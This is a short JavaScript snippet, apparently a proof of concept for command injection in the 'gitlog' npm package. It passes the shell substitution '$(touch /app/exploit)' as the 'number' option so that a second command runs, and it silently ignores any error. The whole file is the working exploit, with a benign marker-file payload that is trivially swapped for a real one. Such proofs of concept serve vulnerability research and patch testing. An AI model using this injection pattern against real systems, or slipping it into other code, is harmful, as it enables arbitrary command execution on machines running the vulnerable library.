const gitlog = require('gitlog').default;
try {
    gitlog({ repo: '/app', number: '$(touch /app/exploit)' });
} catch (err) {
    console.log('ignore error');
}
